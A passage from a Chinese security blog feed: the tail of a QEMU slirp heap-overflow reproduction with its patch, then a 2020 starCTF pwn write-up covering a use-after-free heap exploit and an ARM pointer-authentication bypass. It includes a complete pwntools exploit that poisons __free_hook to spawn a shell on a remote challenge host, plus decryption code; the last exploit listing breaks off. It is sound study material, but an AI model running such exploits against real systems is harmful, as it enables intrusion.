title="漏洞调试"></a>漏洞调试</h2><p>从<code>exp</code>中我们可以看出漏洞利用的大致流程如下</p><ol><li>首先利用堆溢出将<code>m_data</code>的低二字节覆写为<code>0xb00</code>。</li><li>接着触发任意地址写将伪造的<code>eth+ip+icmp</code>和<code>cmd</code>字符串写入到刚刚伪造好的地址处</li><li>覆写<code>m_data</code>指针指向我们刚刚伪造的<code>icmp</code>数据包处</li><li>触发<code>icmp</code>响应，泄漏出堆地址和程序基址</li><li>伪造<code>qemutimer</code></li></ol><p>第一步首先需要利用堆溢出覆写<code>m_data</code>的指针的低二字节，这里我们需要申请两个相邻的堆块，其中一个是通过<code>connect</code>获取得到的<code>so-&gt;so_rcv</code>的<code>buf</code>空间大小，另一个则是<code>MF=1</code>，即数据流中第一个数据包申请得到的数据结构<code>mbuf</code>，即<code>0x670</code>大小的堆块。</p><p>但是这里遇到了一个问题，不知道怎么回事，申请的<code>so-&gt;so_rcv</code>和<code>mbuf</code>并没有相邻，我试了好多次发现只有一次是相邻的。待解决。</p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>我们可以将代码切换到版本<code>3.1.1</code>，发现其就是暴力的在<code>memcpy</code>前面加了长度的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> EMU_IDENT:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line"><span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (m-&gt;m_len &gt; so_rcv-&gt;sb_datalen   <span class="comment">//增加了检查</span></span><br><span class="line">- (so_rcv-&gt;sb_wptr - so_rcv-&gt;sb_data)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);</span><br><span class="line">so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 starCTF 部分pwn WriteUp</title>
      <link href="/posts/922614085.html"/>
      <url>/posts/922614085.html</url>
      
        <content type="html"><![CDATA[<p>感谢<a href="https://ama2in9.top/">xmzyshypnc</a> 师傅手把手教学。</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>漏洞是一个<code>UAF</code>漏洞，程序实现了<code>6</code>个程序，<code>add,delete,edit,show,leave_name,show_name</code>，其中<code>add</code>函数限制了申请堆块的大小，<code>delete</code>函数中存在<code>UAF</code>漏洞，<code>leave_name</code>函数中申请了一个<code>0x400</code>大小的堆块。</p><p>因此这里首先申请<code>4</code>个<code>0x20,fastbin</code>，接着<code>leave_name</code>函数申请一个较大的堆块，使得<code>fastbin</code>堆块合并成<code>0x80</code>大小的<code>small bin</code>，这样就能泄漏出<code>libc</code>基址，由于<code>edit</code>的起始位置是<code>+8</code>开始的，因此再次申请的堆块大小需要覆盖三个<code>fastbin</code>，因此申请一个<code>0x60</code>大小的堆块。这样就可以满足覆写<code>fd</code>指针为<code>free_hook-8</code>和<code>/bin/sh</code>字符串两个要求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0xdd9)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;52.152.231.198&#x27;</span>, <span class="number">8081</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input size\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;input content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input index\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;your name:\n&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_name</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">leave_name(<span class="string">&quot;1212&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0xd0</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">4</span>, <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0xdd9)&quot;)</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x61</span>) + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x8</span>)</span><br><span class="line">payload += <span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">11</span>, payload)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">13</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babypac"><a href="#babypac" class="headerlink" title="babypac"></a>babypac</h2><h3 id="Pointer-Authentication-Code-PAC机制"><a href="#Pointer-Authentication-Code-PAC机制" class="headerlink" title="Pointer Authentication Code, PAC机制"></a>Pointer Authentication Code, PAC机制</h3><p>在<code>2016</code>年的时候ARMv8架构里增加了<code>ARMv8.3-A</code>，这个版本里增加了<code>Pointer Authentication</code> 指令：强化指针安全的一种机制，用来增强栈溢出的保护。该种机制使用指针地址的高位<code>bit</code>（一般来说是高<code>7bit</code>）存储特定于某个指针的签名，之所以可以这样做是因为在当前<code>64</code>位的<code>linux</code>下地址空间也就是指针的实际长度并不是<code>64</code>位。用来计算签名的<code>key</code>存放在处理器内部不可见的寄存器里面。</p><p>使用<code>pa</code>机制之后代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------------------------------------------+</span><br><span class="line">|           | No SSP                    |   SSP                      |</span><br><span class="line">+-----------|---------------------------|----------------------------+</span><br><span class="line">|           | SUB sp, sp, #0x40         | ` PACIASP `                |</span><br><span class="line">|           | STP x29, x30, [sp,#0x30]  | SUB sp, sp, #0x40          |</span><br><span class="line">| Prologue  | ADD x29, sp, #0x30        | STP x29, x30, [sp,#0x30]   |</span><br><span class="line">|           | ...                       | ADD x29, sp, #0x30         |</span><br><span class="line">|           |                           | ...                        |</span><br><span class="line">+-----------|---------------------------|----------------------------+</span><br><span class="line">|           | ...                       | ...                        |</span><br><span class="line">|           | LDP x29,x30,[sp,#0x30]    | LDP x29,x30,[sp,#0x30]     |</span><br><span class="line">| Epilogue  | ADD sp,sp,#0x40           | ADD sp,sp,#0x40            |</span><br><span class="line">|           | RET                       | ` AUTIASP `                |</span><br><span class="line">|           |                           | RET                        |</span><br><span class="line">+--------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>这里<code>RETAA</code>指令就相当于<code>AUTIASP,RET</code>两个指令的组合。此时的返回地址为加密之后的返回地址指针，如<code>0x400ff8-&gt;0x51000000400ff8</code>。因此攻击者很难通过栈溢出覆写返回地址，因为其并不知道该地址加密之后的值，具体来说是指针高<code>7bint</code>的值。</p><p>标准中使用的变体<code>QARMA-64</code>，将一个<code>128 bit</code>密钥，一个<code>64 bit</code>明文值（指针）和一个<code>64 bit</code>调整项（上下文，<code>context</code>）作为输入，并产生一个<code>64 bit</code>密钥作为输出<code>128bit</code> 密文。，该机制提供五个<code>128bit (Pointer Authentication)PA keys</code>，其中<code>APIAkey,APIBkey</code>两个密钥用来加密指令指针，<code>APDAKey,APDBKey</code>用来加密数据指针，<code>APGAKey</code>是一个特殊的全局密钥，通过<code>PACGA</code>指令加密大块的数据。</p><ul><li><code>PAC*</code>指令用来在当前的指针中生成和插入<code>PAC</code>，例如<code>PACIA x8,x9</code>将使用<code>APIAKey</code>密钥对<code>x8</code>中保存的指针进行加密，其中<code>x9</code>中的内容当作<code>context</code>。将加密之后的结果输出到<code>x8</code>中。<code>PACIZA</code>指令类似，只不过将<code>context</code>固定为<code>0</code>。</li><li><code>AUT*</code>指令用来验证<code>PAC</code>的正确性，如果正确则恢复解密后的指针，否则将错误代码写入指针的高位<code>bit</code>，触发错误。<code>AUTIA x8, x9</code>则是将<code>x9</code>中的内容用作<code>context</code>，<code>APIAKey</code>作为密钥解密<code>x8</code>中的指针。</li><li><code>XPAC*</code>则是清除指令中的<code>PAC</code>机制，恢复原本的指针而不经过验证。</li><li><code>BLRA*</code>指令是组合跳转指令，用于验证和跳转，<code>BLRAA x8,x9</code>验证<code>PAC</code>正确之后，跳转到<code>x8</code>指针指向的指令地址。</li><li><code>LDRA*</code>指令是组合数据加载指令，用于验证和数据加载，<code>LDRAA x8,x9</code>验证正确之后将解密之后的地址出的<code>64bit</code>数据<code>load</code>到<code>x8</code>中</li><li><code>RETA*</code>指令是组合返回指令，用于验证和<code>ret</code>。<code>LR</code>寄存器中的指针验证正确之后即跳转。<code>RETAB</code>是用<code>APIBKey</code>密钥验证<code>LR</code>寄存器的值。</li></ul><p>机制可能存在的问题：如果攻击者可以进行任意代码执行，并且程序中存在<code>signing gadget</code>也就是可以<code>sign</code>任意指针的函数。那么攻击者就可以劫持执行流指向该函数，伪造任意的<code>pac</code>加密指针。</p><p>更详细的分析参考<a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">这里</a></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>回到这个题目，题目首先输入<code>name</code>，实现了四种功能<code>add,lock,show,auth</code>，其中定义了一个<code>user</code>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> my_user         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_37)</span><br><span class="line"><span class="number">00000000</span> id              DCQ ?</span><br><span class="line"><span class="number">00000008</span> is_lock         DCQ ?</span><br><span class="line"><span class="number">00000010</span> my_user         ends</span><br></pre></td></tr></table></figure><p><code>add</code>用来增加一个<code>user</code>结构体，<code>lock</code>用来对<code>user</code>种的<code>id</code>进行加密，<code>show</code>函数用来输出<code>name</code>和所有的<code>user</code>结构体的数据。<code>auth</code>是漏洞函数，题目的漏洞很简单，绕过特定的条件之后就会给出一个栈溢出的漏洞。关键是条件怎么绕过，我们看一下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)index &lt; <span class="number">5</span> &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">0x20</span>] &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">0x28</span>] == <span class="number">1LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = *(my_user **)&amp;name[<span class="number">0x10</span> * (<span class="type">int</span>)index + <span class="number">0x20</span>];</span><br><span class="line">  index = encrypt(<span class="number">0x10A9FC70042</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == (my_user *)index )</span><br><span class="line">    index = overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们输入的<code>id</code>是<code>32bit</code>，这里的<code>0x10A9FC70042LL</code>很明显超过了四个字节，因此直接为<code>id</code>赋值走不通。这里注意到<code>lock</code>函数存在一个越界漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lock</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 index; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [xsp+1Ch] [xbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  index = readint();</span><br><span class="line">  v1 = index;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)index &lt; <span class="number">5</span> &amp;&amp; *(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">32</span>] &amp;&amp; !*(_QWORD *)&amp;name[<span class="number">16</span> * (<span class="type">int</span>)index + <span class="number">40</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    index = encrypt(user_list[(<span class="type">int</span>)index].id);</span><br><span class="line">    user_list[v1].id = index;</span><br><span class="line">    user_list[v1].is_lock = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br></pre></td></tr></table></figure><p>其没有判断<code>index&lt;0</code>的情况。并且这里<code>name,user_list</code>相距很近</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000412030</span> ; <span class="type">char</span> name[<span class="number">32</span>]</span><br><span class="line">.bss:<span class="number">0000000000412030</span> name            % <span class="number">0x20</span>                  ; DATA XREF: add+<span class="number">10</span>↑o</span><br><span class="line">.bss:<span class="number">0000000000412030</span>                                         ; lock+<span class="number">40</span>↑o ...</span><br><span class="line">.bss:<span class="number">0000000000412050</span> ; <span class="class"><span class="keyword">struct</span> <span class="title">my_user</span> <span class="title">user_list</span>[5]</span></span><br><span class="line"><span class="class">.<span class="title">bss</span>:</span><span class="number">0000000000412050</span> user_list       % <span class="number">0x50</span>                  ; DATA XREF: lock+<span class="number">7</span>C↑o</span><br><span class="line">.bss:<span class="number">0000000000412050</span> ; .bss          ends</span><br></pre></td></tr></table></figure><p>因此我们可以首先在<code>name</code>中布局好<code>0x10A9FC70042LL</code>的值，接着利用越界漏洞加密该值即可绕过验证。此时我们就可以进入到溢出函数中。但是这里又存在一个问题就是无法获取返回地址。在调试的过程中我们发现<code>lock</code>函数传给<code>encrypt</code>并不是我们输入的数据，而是<code>PACIA</code>过后的数据，也就是如果我们将<code>name</code>设置为<code>0x400ff8</code>其加密的数据是<code>0x51000000400ff8</code>，那么此时如果通过<code>show</code>函数泄漏出加密之后的值，再解密即可得到返回地址加密之后的数据。</p><p>看一下加密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)) &gt;&gt; <span class="number">13</span>);</span><br></pre></td></tr></table></figure><p>这里抽象的理解为递归加密，最外层可以分解为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>) </span><br><span class="line">^</span><br><span class="line">((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>) ^ ((a1 ^ (a1 &lt;&lt; <span class="number">7</span>) ^ ((a1 ^ (<span class="type">unsigned</span> __int64)(a1 &lt;&lt; <span class="number">7</span>)) &gt;&gt; <span class="number">11</span>)) &lt;&lt; <span class="number">31</span>)) &gt;&gt; <span class="number">13</span>);</span><br></pre></td></tr></table></figure><p>也就是可以理解为<code>x ^ (x&gt;&gt;13)</code>。这种加密方式我们可以此次进行破解，比如说<code>y ^ (1 &lt;&lt; (64 -13) - 1)</code>的值就是<code>x</code>高<code>13</code>位的值。那么之后依次进行解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">temp</span>(<span class="params">s, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> &lt;&lt; e) - <span class="number">1</span>) - ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">13</span>), i)) &gt;&gt; <span class="number">13</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">13</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">31</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">31</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">64</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(<span class="built_in">max</span>(<span class="number">0</span>, i - <span class="number">11</span>), i)) &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i - <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">64</span>:</span><br><span class="line">        n = n ^ ((n &amp; temp(i, <span class="built_in">min</span>(i + <span class="number">7</span>, <span class="number">64</span>))) &lt;&lt; <span class="number">7</span>)</span><br><span class="line">        n = n &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        i = i + <span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure><p>最终的<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 